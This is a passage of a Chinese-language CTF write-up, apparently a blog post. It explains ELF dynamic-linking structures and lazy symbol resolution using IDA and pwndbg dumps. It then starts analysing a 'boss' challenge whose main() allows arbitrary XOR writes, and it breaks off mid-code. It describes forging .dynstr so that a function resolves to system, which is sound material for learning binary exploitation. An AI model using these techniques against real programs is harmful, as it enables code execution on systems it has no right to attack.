<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F30</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">,</span> <span class="mi">4004</span><span class="n">A0h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_RELA</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F40</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">8</span><span class="p">,</span> <span class="mi">30</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_RELASZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F50</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">9</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_RELAENT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F60</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFEh</span><span class="p">,</span> <span class="mi">400470</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERNEED</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F70</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFFh</span><span class="p">,</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERNEEDNUM</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F80</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFF0h</span><span class="p">,</span> <span class="mi">400468</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERSYM</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F90</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>           <span class="p">;</span> <span class="n">DT_NULL</span>
</code></pre></div></div> <h5 id="注意关注来自deepunkicudt_rel-动态链接重定位表地址dt_symtab-动态链接符号表地址dt_strtab-动态链接字符串表地址dt_init-初始化代码地址dt_fini-结束代码地址">   注意关注（来自deepunk.icu）<br>   DT_REL 动态链接重定位表地址<br>   DT_SYMTAB 动态链接符号表地址<br>   DT_STRTAB 动态链接字符串表地址<br>   DT_INIT 初始化代码地址<br>   DT_FINI 结束代码地址<br> </h5> <h5 id="dynstr动态链接中的字符串可以从上面的结构体可以寻址可以看到我们使用的puts我们主要关注函数名字符串比如说在no-relro时可以篡改dynamic中指向该段结构的地址指向提前伪造好的dynstr然后触发某函数的重定位这个函数就被重定位到了伪造段中包含的system字样partial-relro-或者-full-relro时这段内存不可写这种方法就使用不了">   .dynstr，动态链接中的字符串，可以从上面的结构体可以寻址。可以看到我们使用的<code class="language-plaintext highlighter-rouge">puts()</code><br>   我们主要关注函数名字符串，比如说在<code class="language-plaintext highlighter-rouge">no RELRO</code>时，可以篡改<code class="language-plaintext highlighter-rouge">.dynamic</code>中指向该段结构的地址指向提前伪造好的<code class="language-plaintext highlighter-rouge">.dynstr</code>，然后触发某函数的重定位，这个函数就被重定位到了伪造段中包含的<code class="language-plaintext highlighter-rouge">system</code>字样。<code class="language-plaintext highlighter-rouge">partial RELRO</code> 或者 <code class="language-plaintext highlighter-rouge">full RELRO</code>时，这段内存不可写，这种方法就使用不了。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">0000000000400420</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">String</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400420</span> <span class="n">unk_400420</span>      <span class="n">db</span>    <span class="mi">0</span>                 <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400420</span>                                         <span class="p">;</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400421</span> <span class="n">aLibcStartMain</span>  <span class="n">db</span> <span class="err">'</span><span class="n">__libc_start_main</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400421</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400433</span> <span class="n">aPuts</span>           <span class="n">db</span> <span class="err">'</span><span class="n">puts</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>             <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040043</span><span class="mi">8</span> <span class="n">aLibcSo6</span>        <span class="n">db</span> <span class="err">'</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>        <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400470</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400442</span> <span class="n">aGlibc225</span>       <span class="n">db</span> <span class="err">'</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">5</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="mi">80</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040044</span><span class="n">E</span> <span class="n">aGlibc234</span>       <span class="n">db</span> <span class="err">'</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">34</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>       <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="mi">90</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040045</span><span class="mi">9</span> <span class="n">aGmonStart</span>      <span class="n">db</span> <span class="err">'</span><span class="n">__gmon_start__</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>   <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040040</span><span class="mi">8</span><span class="err">↑</span><span class="n">o</span>
</code></pre></div></div> <h5 id="dynsym这里是一堆符号表结构体还是主要关注函数的结构体">   .dynsym，这里是一堆符号表结构体，还是主要关注函数的结构体</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">00000000004003</span><span class="n">C0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">Symbol</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">C0</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aLibcStartMain</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">12</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"__libc_start_main"</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aPuts</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">12</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"puts"</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040040</span><span class="mi">8</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aGmonStart</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">20</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"__gmon_start__"</span>
</code></pre></div></div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf64_Word</span> <span class="n">st_name</span><span class="p">;</span> <span class="cm">/* 存的是.dynstr 中的偏移值 */</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="cm">/* 对于导入函数符号而言，它是0x12 */</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> 
	<span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> 
	<span class="n">Elf64_Addr</span> <span class="n">st_value</span><span class="p">;</span> 
	<span class="n">Elf64_Xword</span> <span class="n">st_size</span><span class="p">;</span> 
<span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
<span class="c1">// 对于函数来说，3、4、5、6都是0</span>
</code></pre></div></div> <h5 id="reldyndt_rela和relpltdt_jmprel被称为动态链接重定位表reldyn用于修正data和got中的数据引用函数的信息不在这里一般也不是很关注这个relplt这个段和之前的rel_arg直接相关并且用于修正gotplt俗称的got表在32位中rel_arg是用于计算它的偏移64位里直接就是下标deepunkicu">   .rel.dyn（DT_RELA）和.rel.plt（DT_JMPREL），被称为<code class="language-plaintext highlighter-rouge">动态链接重定位表</code><br>   .rel.dyn,用于修正<code class="language-plaintext highlighter-rouge">.data</code>和<code class="language-plaintext highlighter-rouge">.got</code>中的数据引用，函数的信息不在这里，一般也不是很关注这个<br>   .rel.plt这个段和之前的<code class="language-plaintext highlighter-rouge">rel_arg</code>直接相关，并且用于修正<code class="language-plaintext highlighter-rouge">.got.plt</code>（俗称的got表）。在32位中<code class="language-plaintext highlighter-rouge">rel_arg</code>是用于计算它的偏移，64位里直接就是下标（deepunk.icu）；</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">00000000004004</span><span class="n">A0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">RELA</span> <span class="n">Relocation</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">A0</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">403</span><span class="n">FF0h</span><span class="p">,</span> <span class="mi">100000006</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_GLOB_DAT</span> <span class="n">__libc_start_main</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">B8</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">403</span><span class="n">FF8h</span><span class="p">,</span> <span class="mi">300000006</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_GLOB_DAT</span> <span class="n">__gmon_start__</span>

<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">JMPREL</span> <span class="n">Relocation</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">404018</span><span class="n">h</span><span class="p">,</span> <span class="mi">200000007</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_JUMP_SLOT</span> <span class="n">puts</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span> <span class="n">LOAD</span>            <span class="n">ends</span>
</code></pre></div></div> <h5 id="64位和32位的结构体不一样结构体示例对比一下deepunkicu">   64位和32位的结构体不一样，结构体示例对比一下。（deepunk.icu）<br>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf32_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span>
	<span class="n">Elf32_Word</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf64_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span>
	<span class="n">Elf64_Xword</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf64_Rel</span><span class="p">;</span>
</code></pre></div></div> <h5 id="rel_arg了解之后再来解决一下上面遗留的link_map结构体可以看到存储的是被链接的文件以及它们对应的dynamic以及加载地址偏移由于-no-pie所以执行文件加载地址是0x0之前push的是执行文件的linkmap也就是第一个">   <code class="language-plaintext highlighter-rouge">rel_arg</code>了解之后，再来解决一下上面遗留的<code class="language-plaintext highlighter-rouge">link_map</code>结构体。可以看到存储的是被链接的文件，以及它们对应的<code class="language-plaintext highlighter-rouge">.dynamic</code>以及加载地址偏移（由于<code class="language-plaintext highlighter-rouge">-no-pie</code>所以执行文件加载地址是<code class="language-plaintext highlighter-rouge">0x0</code>）,之前<code class="language-plaintext highlighter-rouge">push</code>的是执行文件的linkmap，也就是第一个</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Node</span>           <span class="n">Objfile</span>                                         <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">testtable</span><span class="o">/</span><span class="n">lazy_load</span><span class="o">&gt;</span> <span class="mh">0x0</span>            <span class="mh">0x403e20</span>        
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                 <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                 <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                     <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span> 
</code></pre></div></div> <h5 id="以其中的libcso6为例看看dynamic的结构与执行文件对比一下">   以其中的libc.so.6为例，看看<code class="language-plaintext highlighter-rouge">.dynamic</code>的结构，与执行文件对比一下。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7ffff7f9cbc0</span>
<span class="mh">0x7ffff7f9cbc0</span><span class="o">:</span> <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000007d69</span>
<span class="mh">0x7ffff7f9cbd0</span><span class="o">:</span> <span class="mh">0x000000000000000e</span>      <span class="mh">0x0000000000007d7e</span>
<span class="mh">0x7ffff7f9cbe0</span><span class="o">:</span> <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000216900</span>
<span class="mh">0x7ffff7f9cbf0</span><span class="o">:</span> <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000010</span>
<span class="mh">0x7ffff7f9cc00</span><span class="o">:</span> <span class="mh">0x0000000000000004</span>      <span class="mh">0x00007ffff7f939f8</span>
<span class="mh">0x7ffff7f9cc10</span><span class="o">:</span> <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00007ffff7d833c8</span>
<span class="mh">0x7ffff7f9cc20</span><span class="o">:</span> <span class="mh">0x0000000000000005</span>      <span class="mh">0x00007ffff7d99650</span>
<span class="mh">0x7ffff7f9cc30</span><span class="o">:</span> <span class="mh">0x0000000000000006</span>      <span class="mh">0x00007ffff7d87ad0</span>
<span class="mh">0x7ffff7f9cc40</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000007f15</span>
<span class="mh">0x7ffff7f9cc50</span><span class="o">:</span> <span class="mh">0x000000000000000b</span>      <span class="mh">0x0000000000000018</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span>  <span class="mh">0x403e20</span>
<span class="mh">0x403e20</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000018</span>
<span class="mh">0x403e30</span><span class="o">:</span>       <span class="mh">0x000000000000000c</span>      <span class="mh">0x0000000000401000</span>
<span class="mh">0x403e40</span><span class="o">:</span>       <span class="mh">0x000000000000000d</span>      <span class="mh">0x000000000040114c</span>
<span class="mh">0x403e50</span><span class="o">:</span>       <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000403e10</span>
<span class="mh">0x403e60</span><span class="o">:</span>       <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x403e70</span><span class="o">:</span>       <span class="mh">0x000000000000001a</span>      <span class="mh">0x0000000000403e18</span>
<span class="mh">0x403e80</span><span class="o">:</span>       <span class="mh">0x000000000000001c</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x403e90</span><span class="o">:</span>       <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00000000004003a0</span>
<span class="mh">0x403ea0</span><span class="o">:</span>       <span class="mh">0x0000000000000005</span>      <span class="mh">0x0000000000400420</span>
<span class="mh">0x403eb0</span><span class="o">:</span>       <span class="mh">0x0000000000000006</span>      <span class="mh">0x00000000004003c0</span>
</code></pre></div></div> <h5 id="可以看到两个链接文件的elf64_dyn的类型基本一致说明两个文件的有关动态链接的结构相似的后面所指向的诸如dynstrdynsymrelplt地址是不一样的是各自的真实地址">   可以看到两个链接文件的ELF64_Dyn的类型基本一致，说明两个文件的有关动态链接的结构相似的，后面所指向的诸如<code class="language-plaintext highlighter-rouge">.dynstr</code>、<code class="language-plaintext highlighter-rouge">.dynsym</code>、<code class="language-plaintext highlighter-rouge">.rel.plt</code>地址是不一样的，是各自的真实地址。</h5> <h5 id="现在简单解释感性的理解_dl_runtime_reslovelink_map-rel_arg是如何借助这些结构重定位某一个函数第一步借助link_map找到dynamic的加载地址进而找到relplt的位置第二步借助rel_arg作为偏移或者下标找到的relplt中指定函数的动态链接重定位表第三步取出动态链接重定位表中的r_offset用于找到gotplt的位置既got表第四步取出动态链接重定位表中的r_info找到函数的动态链接重定位表取出其中的st_name既dynstr中的函数名字符">   现在简单解释（感性的理解）<code class="language-plaintext highlighter-rouge">_dl_runtime_reslove(link_map, rel_arg)</code>是如何借助这些结构重定位某一个函数。<br>   第一步，借助<code class="language-plaintext highlighter-rouge">link_map</code>找到<code class="language-plaintext highlighter-rouge">.dynamic</code>的加载地址，进而找到<code class="language-plaintext highlighter-rouge">.rel.plt</code>的位置。<br>   第二步，借助<code class="language-plaintext highlighter-rouge">rel_arg</code>（作为偏移或者下标），找到的<code class="language-plaintext highlighter-rouge">.rel.plt</code>中指定函数的<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>。<br>   第三步，取出<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>中的<code class="language-plaintext highlighter-rouge">r_offset</code>，用于找到<code class="language-plaintext highlighter-rouge">.got.plt</code>的位置（既got表）<br>   第四步，取出<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>中的<code class="language-plaintext highlighter-rouge">r_info</code>，找到函数的<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>，取出其中的<code class="language-plaintext highlighter-rouge">st_name</code>，既<code class="language-plaintext highlighter-rouge">.dynstr</code>中的函数名字符。</h5> <h3 id="一点补充有关-fcf-protection">一点补充（有关-fcf-protection）</h3> <h5 id="这是ubuntu的gcc默认开启的一项保护措施在第一次函数调用时不会按照上面的流程而是直接到glibc中详情参考httpswwwsoinsidecomquestionaenbeapagmmbfzpviveobc">   这是ubuntu的gcc默认开启的一项保护措施，在第一次函数调用时，不会按照上面的流程，而是直接到glibc中，详情参考https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc</h5> <h3 id="攻击手段">攻击手段</h3> <h5 id="现在来具体分析一下这道boss题怎么做由于给出了source-code所以我们自己编译一个方便调试的执行文件并且把随机数那一部分去掉指令和上面那个demo一样">   现在来具体分析一下这道boss题怎么做。由于给出了source code所以我们自己编译一个方便调试的执行文件，并且把随机数那一部分去掉，指令和上面那个demo一样<br> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>       <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>      <span class="n">Partial</span> <span class="n">RELRO</span>   <span class="o">&lt;---------</span>
    <span class="n">Stack</span><span class="o">:</span>      <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>         <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>        <span class="n">PIE</span> <span class="n">enabled</span>
    <span class="n">SHSTK</span><span class="o">:</span>      <span class="n">Enabled</span>
    <span class="n">IBT</span><span class="o">:</span>        <span class="n">Enabled</span>
</code></pre></div></div> <h5 id="首先来到init函数passwd指向一个mmap出来的空间passwd本身在bss的最高位置然后在这个空间中写入随机数最后把前八位换成固定的deadbeef字符串这样总共就有0x10个已写入字符">   首先来到<code class="language-plaintext highlighter-rouge">init()</code>函数，<code class="language-plaintext highlighter-rouge">passwd</code>指向一个<code class="language-plaintext highlighter-rouge">mmap()</code>出来的空间，<code class="language-plaintext highlighter-rouge">passwd</code>本身在<code class="language-plaintext highlighter-rouge">.bss</code>的最高位置。然后在这个空间中写入随机数，最后把前八位换成固定的<code class="language-plaintext highlighter-rouge">deadbeef</code>字符串，这样总共就有0x10个已写入字符。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="s">"deadbeef"</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="动态调试一下发现多划分了0x2000的长度">   动态调试一下，发现多划分了0x2000的长度。<br> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x4040A0</span> 
<span class="mh">0x4040a0</span> <span class="o">&lt;</span><span class="n">passwd</span><span class="o">&gt;:</span>      <span class="mh">0x00007ffff7fb9000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040b0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040c0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040d0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040e0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
<span class="mh">0x7ffff7fb9000</span>     <span class="mh">0x7ffff7fbd000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">4000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fb9</span><span class="p">]</span>
</code></pre></div></div> <h5 id="再查看一下linkmap的地址">   再查看一下linkmap的地址，</h5> <h5 id="再看看mainread_num就是atoll">   再看看<code class="language-plaintext highlighter-rouge">main()</code>，<code class="language-plaintext highlighter-rouge">read_num()</code>就是<code class="language-plaintext highlighter-rouge">atoll()</code>。<br> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="n">init</span><span class="p">();</span>

    <span class="n">myread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="k">do</span><span class="p">{</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
        <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">passwd</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">^=</span> <span class="n">value</span><span class="p">;</span>
